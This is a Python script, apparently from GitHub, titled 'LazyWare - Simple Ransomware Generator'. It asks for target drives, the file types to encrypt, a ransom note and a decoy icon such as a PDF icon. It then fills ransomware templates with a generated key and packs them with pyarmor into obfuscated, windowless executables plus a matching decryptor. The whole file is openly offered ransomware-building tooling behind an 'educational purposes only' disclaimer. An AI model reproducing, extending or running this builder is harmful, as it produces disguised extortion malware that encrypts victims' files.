import os
import platform
import base64
import datetime
from colorama import Fore

red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
blue = Fore.BLUE
white = Fore.WHITE




def clear():
	operating_system = platform.system()
	if "indows" in operating_system:
		os.system("cls")	
	elif "inux" in operating_system:
		os.system("clear")	
	else:
		pass
	print(green+"""

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __           """+yellow+"""v1.0"""+green+"""          __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   """+red+"""DIE"""+green+"""    `98v8P'  """+red+"""HUMAN"""+green+"""   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
                    LazyWare - Simple Ransomware Generator
                    
"""+blue+"""Disclaimer	"""+yellow+""":"""+red+""" This tool is for educational purposes only. I am not responsible for your harmful actions!
"""+blue+"""Author		"""+yellow+""":"""+red+""" Justakazh / https://github.com/justakazh 

"""+white)


clear()
#key 
key = base64.urlsafe_b64encode(os.urandom(32)).decode('utf-8')
print("""
Insert disk or target folder
example: E:,D:,C:\\users\\Administrator\\Documents
""")

tdisk = str(input("-> "))
disk = tdisk.split(",")

clear()
# filename
print("""
Insert Filename
example: prize
""")
fname = str(input("-> "))


clear()
# enc_extension
print("""
Insert extension for encrypted files. 
when file encrypted, there will be automaticly change the extension data.docx to data.docx.your_extension
example: .encrypted
""")
ext = str(input("-> "))

clear()

# icon
print("""
Insert Icon
example: icons/pdf.ico
""")
icon = str(input("-> "))

clear()

# target files
print("""
Insert target file extension
example: .docx,.pdf,.jpg,.mp4
""")
target_ext = str(input("-> "))
t_ext = target_ext.split(",")

clear()

# readme
print("""
input readme file
example: readme.txt
""")
r_in = str(input("-> "))
readme = open(r_in, "r").read()

clear()

pwd = os.getcwd()
date = str(datetime.datetime.now().date())
fout = os.path.join(pwd, "output", date)

try:
	os.mkdir("output")
	os.mkdir(fout)
except:
	pass


with open("lib/source.py", "r") as f:
	read = f.read()
	cofig = read.replace("##key##", key)
	cofig = cofig.replace("##disk##", str(disk))
	cofig = cofig.replace("##enc_extension##", str(ext))
	cofig = cofig.replace("##file_to_enc##", str(t_ext))
	cofig = cofig.replace("##readme##", str(readme))
	open(fout+"/"+fname+".py", "w").write(cofig)

with open("lib/source_de.py", "r") as f:
	read = f.read()
	cofig = read.replace("##key##", key)
	cofig = cofig.replace("##disk##", str(disk))
	cofig = cofig.replace("##enc_extension##", str(ext))
	cofig = cofig.replace("##file_to_enc##", str(t_ext))
	open(fout+"/"+"decryptor_"+fname+".py", "w").write(cofig)


os.system('/home/kali/.local/bin/pyarmor pack -e " --onefile --noconsole -i '+icon+'" '+fout+'/'+fname+'.py ')
os.system('/home/kali/.local/bin/pyarmor pack -e " --onefile  " '+fout+'/decryptor_'+fname+'.py ')
open(fout+"/"+"KEY.txt", "w").write(key)
exe_file = os.path.join(fout, "dist")


print("""
\n\n\n
\t\t """+red+"""KEY 	: """+green+key+"""
\t\t """+red+"""Output : """+green+exe_file+red+""" 
\n\t\t """+yellow+"""Please dont lose the KEY !
"""+white)
